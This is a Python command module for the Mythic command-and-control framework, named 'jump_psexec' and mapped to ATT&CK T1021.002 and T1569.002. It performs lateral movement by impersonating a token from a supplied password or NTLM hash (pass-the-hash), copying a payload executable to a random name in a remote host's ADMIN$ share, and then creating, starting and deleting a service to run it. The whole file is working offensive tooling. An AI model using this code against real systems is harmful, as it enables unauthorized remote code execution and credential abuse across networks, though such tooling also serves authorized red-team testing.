from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json
import uuid
import random
import string

_LOCAL_TARGETS = {"localhost", "127.0.0.1", "::1"}


def _is_local(target: str) -> bool:
    return target.lower() in _LOCAL_TARGETS


class JumpPsexecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=1)],
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[ParameterGroupInfo(required=True, ui_position=2)],
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the uploaded binary.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
            ),
            CommandParameter(
                name="service_name",
                cli_name="ServiceName",
                display_name="Service Name",
                type=ParameterType.String,
                description="Name of temporary service to create. Leave blank for random UUID.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=4)],
            ),
            CommandParameter(
                name="username",
                cli_name="Username",
                display_name="Username",
                type=ParameterType.String,
                description="Optional username for alternate credential authentication.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=5)],
            ),
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Optional domain for alternate credential authentication.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=6)],
            ),
            CommandParameter(
                name="password",
                cli_name="Password",
                display_name="Password",
                type=ParameterType.String,
                description="Optional plaintext password for alternate credential authentication.",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=7)],
            ),
            CommandParameter(
                name="hash",
                cli_name="Hash",
                display_name="NTLM Hash",
                type=ParameterType.String,
                description="Optional NTLM hash for pass-the-hash authentication (used instead of password).",
                default_value="",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=8)],
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


async def mirror_up_output(task: PTTaskCompletionFunctionMessage):
    response_search = await SendMythicRPCResponseSearch(
        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
    )
    if response_search.Success:
        for r in response_search.Responses:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.TaskData.Task.ID,
                    Response=r.Response.encode(),
                )
            )
        await SendMythicRPCResponseCreate(
            MythicRPCResponseCreateMessage(
                TaskID=task.TaskData.Task.ID,
                Response="\n".encode(),
            )
        )


async def psexec_delete_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to delete service"

    if task.TaskData.args.get_arg("_lm_used_token"):
        await SendMythicRPCTaskUpdate(
            MythicRPCTaskUpdateMessage(
                TaskID=task.TaskData.Task.ID,
                UpdateStatus="reverting token",
            )
        )
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                SubtaskCallbackFunction="rev2self_callback",
                CommandName="rev2self",
                Params=json.dumps({}),
            )
        )
    else:
        response.Completed = True

    return response


async def rev2self_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to revert token"
    return response


# ── local path: wait for sc start response, then delete ──────────────────────

async def psexec_start_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Used only for local targets — waits for sc start to complete before deleting."""
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to start service"

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="deleting service",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_delete_callback",
            CommandName="sc",
            Params=json.dumps(
                {
                    "delete": True,
                    "computer": task.TaskData.args.get_arg("target"),
                    "service": task.TaskData.args.get_arg("_lm_service_name"),
                }
            ),
        )
    )
    return response


async def psexec_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Used only for local targets — waits for sc create response before starting."""
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to create service"
        response.Completed = True
        return response

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="starting service",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="psexec_start_callback",
            CommandName="sc",
            Params=json.dumps(
                {
                    "start": True,
                    "computer": task.TaskData.args.get_arg("target"),
                    "service": task.TaskData.args.get_arg("_lm_service_name"),
                }
            ),
        )
    )
    return response


# ── shared upload callback ────────────────────────────────────────────────────

async def upload_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to copy over file"
        response.Completed = True
        return response

    target = task.TaskData.args.get_arg("target") or ""
    service = task.TaskData.args.get_arg("_lm_service_name") or ""
    computer = target

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="creating service",
        )
    )

    if _is_local(target):
        # Local: wait for each sc response before proceeding
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                SubtaskCallbackFunction="psexec_callback",
                CommandName="sc",
                Params=json.dumps(
                    {
                        "create": True,
                        "computer": computer,
                        "service": service,
                        "binpath": task.TaskData.args.get_arg("_lm_exec_cmd"),
                        "display_name": service,
                    }
                ),
            )
        )
    else:
        # Remote: fire sc create, sleep 15s, fire sc start (via callback for delete), sleep 15s, fire sc delete
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                CommandName="sc",
                Params=json.dumps(
                    {
                        "create": True,
                        "computer": computer,
                        "service": service,
                        "binpath": task.TaskData.args.get_arg("_lm_exec_cmd"),
                        "display_name": service,
                    }
                ),
            )
        )
        await asyncio.sleep(15)
        await SendMythicRPCTaskUpdate(
            MythicRPCTaskUpdateMessage(
                TaskID=task.TaskData.Task.ID,
                UpdateStatus="starting remote service",
            )
        )
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                CommandName="sc",
                Params=json.dumps(
                    {
                        "start": True,
                        "computer": computer,
                        "service": service,
                    }
                ),
            )
        )
        await asyncio.sleep(15)
        await SendMythicRPCTaskUpdate(
            MythicRPCTaskUpdateMessage(
                TaskID=task.TaskData.Task.ID,
                UpdateStatus="deleting remote service",
            )
        )
        await SendMythicRPCTaskCreateSubtask(
            MythicRPCTaskCreateSubtaskMessage(
                TaskID=task.TaskData.Task.ID,
                SubtaskCallbackFunction="psexec_delete_callback",
                CommandName="sc",
                Params=json.dumps(
                    {
                        "delete": True,
                        "computer": computer,
                        "service": service,
                    }
                ),
            )
        )

    return response


async def token_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, Completed=False)
    await mirror_up_output(task=task)
    if "error" in task.SubtaskData.Task.Status.lower():
        response.TaskStatus = "error: failed to create token"
        response.Completed = True
        return response

    file_id = task.TaskData.args.get_arg("payload")
    remote_unc = task.TaskData.args.get_arg("_lm_remote_unc")

    await SendMythicRPCTaskUpdate(
        MythicRPCTaskUpdateMessage(
            TaskID=task.TaskData.Task.ID,
            UpdateStatus="uploading file...",
        )
    )
    await SendMythicRPCTaskCreateSubtask(
        MythicRPCTaskCreateSubtaskMessage(
            TaskID=task.TaskData.Task.ID,
            SubtaskCallbackFunction="upload_callback",
            CommandName="upload",
            Params=json.dumps(
                {
                    "remote_path": remote_unc,
                    "file": file_id,
                }
            ),
        )
    )
    return response


class JumpPsexecCommand(CommandBase):
    cmd = "jump_psexec"
    attributes = CommandAttributes(dependencies=["upload", "sc", "make_token", "rev2self"])
    needs_admin = True
    help_cmd = "jump_psexec -Target <host> -Payload <file> [-Username <user>] [-Domain <domain>] [-Password <pass> | -Hash <ntlm>]"
    description = "Lateral movement workflow: upload payload, then execute via remote service creation."
    version = 3
    script_only = True
    author = "@Lavender-exe"
    argument_class = JumpPsexecArguments
    attackmapping = ["T1021.002", "T1569.002"]
    completion_functions = {
        "token_callback": token_callback,
        "upload_callback": upload_callback,
        "psexec_callback": psexec_callback,
        "psexec_start_callback": psexec_start_callback,
        "psexec_delete_callback": psexec_delete_callback,
        "rev2self_callback": rev2self_callback,
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

        target = taskData.args.get_arg("target")
        file_id = taskData.args.get_arg("payload")
        extra_args = taskData.args.get_arg("command") or ""
        username = taskData.args.get_arg("username") or ""
        domain = taskData.args.get_arg("domain") or ""
        password = taskData.args.get_arg("password") or ""
        ntlm_hash = taskData.args.get_arg("hash") or ""

        rand_name = "".join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"
        remote_unc = f"\\\\{target}\\ADMIN$\\Temp\\{rand_name}"
        exec_cmd = f"C:\\Windows\\Temp\\{rand_name}"
        if extra_args:
            exec_cmd += f" {extra_args}"

        service_name = taskData.args.get_arg("service_name") or str(uuid.uuid4())

        taskData.args.add_arg("_lm_exec_cmd", exec_cmd)
        taskData.args.add_arg("_lm_service_name", service_name)
        taskData.args.add_arg("_lm_remote_unc", remote_unc)
        taskData.args.add_arg("_lm_used_token", bool(username and (password or ntlm_hash)))

        response.DisplayParams = f"{target} -> {remote_unc}"

        using_creds = username and (password or ntlm_hash)
        if using_creds:
            token_params = {
                "username": username,
                "domain": domain or ".",
            }
            token_params["password"] = ntlm_hash if ntlm_hash else password

            response.TaskStatus = "creating token..."
            await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    SubtaskCallbackFunction="token_callback",
                    CommandName="make_token",
                    Params=json.dumps(token_params),
                )
            )
        else:
            response.TaskStatus = "uploading file..."
            await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    SubtaskCallbackFunction="upload_callback",
                    CommandName="upload",
                    Params=json.dumps(
                        {
                            "remote_path": remote_unc,
                            "file": file_id,
                        }
                    ),
                )
            )

        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
